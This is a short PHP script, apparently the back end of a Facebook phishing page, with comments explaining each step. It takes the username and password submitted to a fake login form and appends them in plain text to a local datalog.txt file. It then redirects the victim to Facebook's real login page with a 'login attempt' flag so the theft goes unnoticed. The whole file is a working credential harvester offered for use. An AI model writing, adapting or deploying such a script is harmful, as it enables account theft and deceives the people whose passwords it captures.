<?php
// Here I'm get the User name and password  value to the $username and $password
$username=$_POST["username"];
$password=$_POST["password"];


//echo "$username : " . $password;

//Create a datalog.txt file for store the username and password if file cant open die
$myfile = fopen("datalog.txt", "a") or die("unable to open file!");

//Store values in this $txt variable name
$txt="USERNAME=$username, PASSWORD=$password\n";

// when we get the vales it will be write the datalog file
fwrite($myfile, "\n".$txt);
fclose($myfile);

// after 
header("Location: https://www.facebook.com/login.php?login_attempt=1&lwv=110");

exit();

?>
